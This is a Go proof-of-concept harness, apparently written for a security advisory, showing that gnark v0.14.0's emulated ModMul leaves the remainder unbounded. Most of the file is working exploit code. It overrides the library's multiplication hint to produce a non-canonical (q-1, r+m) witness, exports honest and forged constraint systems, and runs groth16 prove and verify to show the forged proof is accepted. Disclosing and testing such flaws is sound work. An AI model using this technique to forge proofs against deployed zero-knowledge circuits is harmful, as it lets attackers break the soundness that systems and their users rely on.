// Advisory gadget harness: the variable-modulus remainder issue in
// std/math/emulated (gnark v0.14.0). ModMul(a, b, m) constrains the hinted
// remainder r only through the limb identity a*b = q*m + r with per-limb width
// checks; nothing enforces r < m, so the non-canonical representative r+m is
// prover-reachable by shifting the hint to (q-1, r+m) with recomputed carries.
// The deferred multiplication check is a polynomial identity evaluated at a
// commitment-derived challenge, and the shifted triple satisfies that identity
// at every point, so the forgery survives the real prover, not just the
// advice-challenge relaxation. Modes:
//
//	go run .          exports honest and shifted witnesses (advice challenge)
//	go run . prove    groth16 setup/prove/verify at the deployed semantics
package main

import (
	"encoding/json"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark-crypto/ecc/bn254/fr"
	"github.com/consensys/gnark/backend"
	"github.com/consensys/gnark/backend/groth16"
	"github.com/consensys/gnark/constraint"
	csbn "github.com/consensys/gnark/constraint/bn254"
	"github.com/consensys/gnark/constraint/solver"
	"github.com/consensys/gnark/frontend"
	frontendcs "github.com/consensys/gnark/frontend/cs"
	"github.com/consensys/gnark/frontend/cs/r1cs"
	"github.com/consensys/gnark/std/math/emulated"
	"github.com/consensys/gnark/std/math/emulated/emparams"
)

type ModMulCircuit struct {
	A emulated.Element[emparams.Mod1e512] `gnark:",public"`
	B emulated.Element[emparams.Mod1e512] `gnark:",public"`
	M emulated.Element[emparams.Mod1e512] `gnark:",public"`
	R emulated.Element[emparams.Mod1e512] `gnark:",public"`
}

func (c *ModMulCircuit) Define(api frontend.API) error {
	f, err := emulated.NewField[emparams.Mod1e512](api)
	if err != nil {
		return err
	}
	res := f.ModMul(&c.A, &c.B, &c.M)
	f.AssertIsEqual(res, &c.R)
	return nil
}

// recompose/decompose in base 2^nbBits, little-endian limbs.
func recompose(limbs []*big.Int, nbBits uint) *big.Int {
	out := new(big.Int)
	for i := len(limbs) - 1; i >= 0; i-- {
		out.Lsh(out, nbBits)
		out.Add(out, limbs[i])
	}
	return out
}

func decompose(v *big.Int, nbBits uint, limbs []*big.Int) {
	mask := new(big.Int).Lsh(big.NewInt(1), nbBits)
	mask.Sub(mask, big.NewInt(1))
	rest := new(big.Int).Set(v)
	for i := range limbs {
		limbs[i].And(rest, mask)
		rest.Rsh(rest, nbBits)
	}
}

func limbMul(a, b []*big.Int) []*big.Int {
	out := make([]*big.Int, len(a)+len(b)-1)
	for i := range out {
		out[i] = new(big.Int)
	}
	for i := range a {
		for j := range b {
			out[i+j].Add(out[i+j], new(big.Int).Mul(a[i], b[j]))
		}
	}
	return out
}

// shiftedMulHint reproduces the layout of emulated's mulHint and, when the
// recomposed modulus equals shiftTarget, returns the non-canonical triple
// (q-1, r+m, carries') instead of the canonical one.
func shiftedMulHint(shiftTarget *big.Int) solver.Hint {
	return func(field *big.Int, inputs, outputs []*big.Int) error {
		nbBits := uint(inputs[0].Int64())
		nbLimbs := int(inputs[1].Int64())
		nbALen := int(inputs[2].Int64())
		nbQuoLen := int(inputs[3].Int64())
		nbBLen := len(inputs) - 4 - nbLimbs - nbALen
		ptr := 4
		plimbs := inputs[ptr : ptr+nbLimbs]
		ptr += nbLimbs
		alimbs := inputs[ptr : ptr+nbALen]
		ptr += nbALen
		blimbs := inputs[ptr : ptr+nbBLen]

		nbCarryLen := len(outputs) - nbQuoLen - nbLimbs
		quoLimbs := outputs[:nbQuoLen]
		remLimbs := outputs[nbQuoLen : nbQuoLen+nbLimbs]
		carryLimbs := outputs[nbQuoLen+nbLimbs : nbQuoLen+nbLimbs+nbCarryLen]

		p := recompose(plimbs, nbBits)
		a := recompose(alimbs, nbBits)
		b := recompose(blimbs, nbBits)
		quo, rem := new(big.Int), new(big.Int)
		ab := new(big.Int).Mul(a, b)
		if p.Sign() != 0 {
			quo.QuoRem(ab, p, rem)
		}
		if shiftTarget != nil && p.Cmp(shiftTarget) == 0 {
			if quo.Sign() <= 0 {
				return fmt.Errorf("shift requires quotient >= 1")
			}
			quo.Sub(quo, big.NewInt(1))
			rem.Add(rem, p)
		}
		decompose(quo, nbBits, quoLimbs)
		decompose(rem, nbBits, remLimbs)

		lhs := limbMul(alimbs, blimbs)
		rhs := limbMul(quoLimbs, plimbs)
		for i := range remLimbs {
			if i < len(rhs) {
				rhs[i].Add(rhs[i], remLimbs[i])
			} else {
				rhs = append(rhs, new(big.Int).Set(remLimbs[i]))
			}
		}
		carry := new(big.Int)
		for i := range carryLimbs {
			if i < len(lhs) {
				carry.Add(carry, lhs[i])
			}
			if i < len(rhs) {
				carry.Sub(carry, rhs[i])
			}
			carry.Rsh(carry, nbBits)
			carryLimbs[i].Mod(carry, field)
		}
		return nil
	}
}

func adviceChallenge(value string) solver.Hint {
	v, _ := new(big.Int).SetString(value, 10)
	return func(mod *big.Int, _ []*big.Int, outs []*big.Int) error {
		for _, x := range outs {
			x.Mod(v, mod)
		}
		return nil
	}
}

const nbBits = 64

// test values: m = secp256k1 base-field prime, a and b fixed 200-bit values.
var (
	mVal, _ = new(big.Int).SetString("fffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f", 16)
	aVal, _ = new(big.Int).SetString("123456789abcdef0fedcba9876543210deadbeefcafebabe1234", 16)
	bVal, _ = new(big.Int).SetString("f0e1d2c3b4a5968778695a4b3c2d1e0f1122334455667788aabb", 16)
)

func elem(v *big.Int) emulated.Element[emparams.Mod1e512] {
	return emulated.ValueOf[emparams.Mod1e512](v)
}

func assignment(r *big.Int) *ModMulCircuit {
	return &ModMulCircuit{A: elem(aVal), B: elem(bVal), M: elem(mVal), R: elem(r)}
}

type Term struct {
	Wire  int    `json:"wire"`
	Coeff string `json:"coefficient"`
}
type Row struct {
	L []Term `json:"l"`
	R []Term `json:"r"`
	O []Term `json:"o"`
}
type Export struct {
	Name           string   `json:"name"`
	Source         string   `json:"source"`
	Scope          string   `json:"scope"`
	GoVersion      string   `json:"go_version"`
	Gnark          string   `json:"gnark"`
	Prime          string   `json:"prime"`
	Names          []string `json:"names"`
	Values         []string `json:"values"`
	Fixed          []int    `json:"fixed"`
	Targets        []int    `json:"targets"`
	Rows           []Row    `json:"rows"`
	Public         []string `json:"public_names"`
	Secret         []string `json:"secret_names"`
	Solved         bool     `json:"gnark_solve_passed"`
	CompileSeconds float64  `json:"compile_seconds"`
	SolveSeconds   float64  `json:"solve_seconds"`
}

func export(name, scope string, assign frontend.Circuit, opts ...solver.Option) error {
	started := time.Now()
	generic, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &ModMulCircuit{})
	if err != nil {
		return err
	}
	compileSeconds := time.Since(started).Seconds()
	sys := generic.(*csbn.R1CS)
	w, err := frontend.NewWitness(assign, ecc.BN254.ScalarField())
	if err != nil {
		return err
	}
	started = time.Now()
	raw, err := sys.Solve(w, opts...)
	if err != nil {
		return fmt.Errorf("solve: %w", err)
	}
	solution := raw.(*csbn.R1CSSolution)
	e := Export{CompileSeconds: compileSeconds, SolveSeconds: time.Since(started).Seconds(),
		Name: name, Source: "gnark v0.14.0 std/math/emulated ModMul (variable modulus)",
		Scope: scope, GoVersion: runtime.Version(), Gnark: "v0.14.0",
		Prime: fr.Modulus().String(), Public: sys.Public, Secret: sys.Secret, Solved: true}
	for i := range solution.W {
		var value big.Int
		solution.W[i].BigInt(&value)
		e.Values = append(e.Values, value.String())
		var wireName string
		if i < len(sys.Public) {
			wireName = sys.Public[i]
			// conditioned set: ONE plus the A, B, M limbs; targets: the R limbs
			if strings.HasPrefix(wireName, "R") {
				e.Targets = append(e.Targets, i)
			} else {
				e.Fixed = append(e.Fixed, i)
			}
		} else if i < len(sys.Public)+len(sys.Secret) {
			wireName = sys.Secret[i-len(sys.Public)]
		} else {
			wireName = fmt.Sprintf("internal_%d", i)
		}
		e.Names = append(e.Names, wireName)
	}
	terms := func(expression constraint.LinearExpression) []Term {
		result := []Term{}
		for _, t := range expression {
			index := t.WireID()
			if t.IsConstant() {
				index = -1
			}
			result = append(result, Term{Wire: index, Coeff: sys.ToBigInt(sys.GetCoefficient(t.CoeffID())).String()})
		}
		return result
	}
	for _, row := range sys.GetR1Cs() {
		e.Rows = append(e.Rows, Row{terms(row.L), terms(row.R), terms(row.O)})
	}
	data, err := json.Marshal(e)
	if err != nil {
		return err
	}
	outDir := os.Getenv("ADVISORY_EXPORT_DIR")
	if outDir == "" {
		outDir = "exports-advisory"
	}
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}
	if err := os.WriteFile(filepath.Join(outDir, name+".json"), append(data, '\n'), 0644); err != nil {
		return err
	}
	fmt.Printf("EXPORTED %s: constraints=%d wires=%d fixed=%d targets=%v\n",
		name, len(e.Rows), len(e.Values), len(e.Fixed), e.Targets)
	return nil
}

func proveCase(name string, assign frontend.Circuit, opts ...solver.Option) {
	sys, err := frontend.Compile(ecc.BN254.ScalarField(), r1cs.NewBuilder, &ModMulCircuit{})
	if err != nil {
		fmt.Printf("PROVE %s: compile error: %v\n", name, err)
		return
	}
	pk, vk, err := groth16.Setup(sys)
	if err != nil {
		fmt.Printf("PROVE %s: setup error: %v\n", name, err)
		return
	}
	full, err := frontend.NewWitness(assign, ecc.BN254.ScalarField())
	if err != nil {
		fmt.Printf("PROVE %s: witness error: %v\n", name, err)
		return
	}
	proof, err := groth16.Prove(sys, pk, full, backend.WithSolverOptions(opts...))
	if err != nil {
		fmt.Printf("PROVE %s: prove REJECTED: %.140s\n", name, err.Error())
		return
	}
	public, _ := full.Public()
	verr := groth16.Verify(proof, vk, public)
	fmt.Printf("PROVE %s: proof produced, verify error=%v\n", name, verr)
}

func main() {
	rHonest := new(big.Int).Mod(new(big.Int).Mul(aVal, bVal), mVal)
	rShift := new(big.Int).Add(rHonest, mVal)
	mulHintID := solver.GetHintID(emulated.GetHints()[3]) // mulHint
	commitID := solver.GetHintID(frontendcs.Bsb22CommitmentComputePlaceholder)
	advice := solver.OverrideHint(commitID, adviceChallenge("12345678910111213141516171819202122232425"))

	if len(os.Args) > 1 && os.Args[1] == "prove" {
		proveCase("modmul_honest", assignment(rHonest))
		proveCase("modmul_shifted_r_plus_m", assignment(rShift),
			solver.OverrideHint(mulHintID, shiftedMulHint(mVal)))
		return
	}
	must := func(err error) {
		if err != nil {
			fmt.Fprintln(os.Stderr, "FATAL:", err)
			os.Exit(1)
		}
	}
	must(export("modmul_honest", "Fix A,B,M; target R limbs; canonical remainder",
		assignment(rHonest), advice,
		solver.OverrideHint(mulHintID, shiftedMulHint(nil))))
	must(export("modmul_shifted", "Same statement; hint shifted to (q-1, r+m)",
		assignment(rShift), advice,
		solver.OverrideHint(mulHintID, shiftedMulHint(mVal))))
}
